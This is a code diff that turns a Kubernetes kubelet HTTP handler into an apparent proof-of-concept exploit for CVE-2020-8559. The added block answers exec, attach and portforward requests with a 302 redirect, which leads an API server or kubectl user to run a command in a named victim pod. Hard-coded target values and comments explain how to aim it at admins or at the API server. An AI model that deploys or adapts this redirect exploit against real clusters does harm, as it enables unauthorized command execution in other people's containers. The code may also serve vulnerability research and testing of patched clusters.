@@ -867,6 +867,28 @@ func (s *Server) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 
 	method, path := req.Method, trimURLPath(req.URL.Path)
 
+	////
+	////
+	// If path is vulnerable to CVE-2020-8559 send 302 redirect with malicious Location header
+	////
+	////
+	protocol := "https"
+	// If attacking requests from admins using the kubectl command
+	//     host == hostname of the Kubernetes API server obtained from `kubectl -v 8 get pods`
+	// If attacing the Kubernetes API Server
+	//     host == hostname of the Node the Victim container is running on
+	host := "internal-api-app-25-prod-k8s-local-123456-123456789.us-west-2.elb.amazonaws.com"
+	namespace := "default"
+	pod := "victim-675759495f-pmfbk"
+	container := "victim"
+	command := "hostname"
+	if strings.Contains(req.URL.Path, "/exec") || strings.Contains(req.URL.Path, "/attach") || strings.Contains(req.URL.Path, "/portforward") {
+		fmt.Println("--------------------------------------------------------------")
+		fmt.Println("Sending Redirect")
+		fmt.Println("--------------------------------------------------------------")
+		http.Redirect(w, req, protocol+"://"+host+"/api/v1/namespaces/"+namespace+"/pods/"+pod+"/exec?command="+command+"&container="+container+"&stderr=true&stdout=true", 302)
+	}
+
 	longRunning := strconv.FormatBool(isLongRunningRequest(path))
 
 	servermetrics.HTTPRequests.WithLabelValues(method, path, serverType, longRunning).Inc()
